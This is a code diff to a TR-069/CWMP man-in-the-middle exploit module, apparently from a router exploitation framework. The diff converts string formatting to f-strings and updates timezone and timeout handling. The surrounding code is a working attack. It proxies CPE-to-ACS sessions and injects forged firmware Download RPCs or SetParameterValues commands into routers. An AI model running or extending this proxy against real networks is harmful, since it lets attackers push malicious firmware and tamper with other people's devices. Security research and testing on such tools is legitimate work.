@@ -95,10 +95,10 @@ def _inject_firmware_payload(firmware_url: str) -> bytes:
     response = (
         "HTTP/1.1 200 OK\r\n"
         "Content-Type: text/xml; charset=utf-8\r\n"
-        "Content-Length: {}\r\n"
+        f"Content-Length: {len(body)}\r\n"
         "Connection: keep-alive\r\n"
         "\r\n"
-    ).format(len(body)).encode("latin-1") + body
+    ).encode("latin-1") + body
     return response
 
 
@@ -110,27 +110,27 @@ def _inject_config_payload(param_name: str, param_value: str) -> bytes:
     response = (
         "HTTP/1.1 200 OK\r\n"
         "Content-Type: text/xml; charset=utf-8\r\n"
-        "Content-Length: {}\r\n"
+        f"Content-Length: {len(body)}\r\n"
         "Connection: keep-alive\r\n"
         "\r\n"
-    ).format(len(body)).encode("latin-1") + body
+    ).encode("latin-1") + body
     return response
 
 
 def _log_cwmp(direction: str, data: bytes) -> None:
     """Log CWMP XML snippets."""
-    ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
+    ts = datetime.datetime.now(datetime.UTC).isoformat()
     try:
         text = data[:1024].decode("latin-1", errors="replace")
         for keyword in ("Inform", "GetParameterValues", "SetParameterValues",
                         "Download", "Reboot", "cwmp:", "EventCode"):
             if keyword in text:
                 snippet = text[:400].replace("\n", " ").replace("\r", "")
-                print_info("[TR069-MITM] [{}] {} | {}".format(ts, direction, snippet))
+                print_info(f"[TR069-MITM] [{ts}] {direction} | {snippet}")
                 return
         if "HTTP" in text or "POST" in text:
             first_line = text.split("\n")[0][:160]
-            print_info("[TR069-MITM] [{}] {} {}".format(ts, direction, first_line))
+            print_info(f"[TR069-MITM] [{ts}] {direction} {first_line}")
     except Exception:
         pass
 
@@ -159,7 +159,7 @@ def _proxy_session(
         else:
             acs_conn = acs_raw
     except Exception as exc:
-        print_error("[TR069-MITM] Cannot reach ACS {}:{}: {}".format(acs_host, acs_port, exc))
+        print_error(f"[TR069-MITM] Cannot reach ACS {acs_host}:{acs_port}: {exc}")
         client_sock.close()
         return
 
@@ -192,17 +192,13 @@ def _proxy_session(
                             injected_response = _inject_firmware_payload(firmware_url)
                             client_sock.sendall(injected_response)
                             print_success(
-                                "[TR069-MITM] INJECTED firmware Download RPC -> {} pointing to {}".format(
-                                    client_addr[0], firmware_url
-                                )
+                                f"[TR069-MITM] INJECTED firmware Download RPC -> {client_addr[0]} pointing to {firmware_url}"
                             )
                         elif inject_mode == "config" and config_param:
                             injected_response = _inject_config_payload(config_param, config_value)
                             client_sock.sendall(injected_response)
                             print_success(
-                                "[TR069-MITM] INJECTED SetParameterValues {}={} -> {}".format(
-                                    config_param, config_value, client_addr[0]
-                                )
+                                f"[TR069-MITM] INJECTED SetParameterValues {config_param}={config_value} -> {client_addr[0]}"
                             )
                         injected = True
                     else:
@@ -313,9 +309,7 @@ class Exploit(Exploit):
             print_error("[TR069-MITM] Set 'destructive true' to enable live proxy.")
             return
 
-        print_status("[TR069-MITM] Starting CWMP proxy on {}:{} -> {}:{}...".format(
-            self.listen_host, self.listen_port, self.acs_host, self.acs_port
-        ))
+        print_status(f"[TR069-MITM] Starting CWMP proxy on {self.listen_host}:{self.listen_port} -> {self.acs_host}:{self.acs_port}...")
 
         try:
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -323,12 +317,10 @@ class Exploit(Exploit):
             server.bind((str(self.listen_host), int(self.listen_port)))
             server.listen(int(self.max_clients))
         except OSError as exc:
-            print_error("[TR069-MITM] Bind failed: {}".format(exc))
+            print_error(f"[TR069-MITM] Bind failed: {exc}")
             return
 
-        print_success("[TR069-MITM] Listening on {}:{}. Press Ctrl+C to stop.".format(
-            self.listen_host, self.listen_port
-        ))
+        print_success(f"[TR069-MITM] Listening on {self.listen_host}:{self.listen_port}. Press Ctrl+C to stop.")
         _stop_event.clear()
         server.settimeout(1.0)
 
@@ -336,7 +328,7 @@ class Exploit(Exploit):
             while not _stop_event.is_set():
                 try:
                     client_conn, client_addr = server.accept()
-                except socket.timeout:
+                except TimeoutError:
                     continue
                 t = threading.Thread(
                     target=_proxy_session,
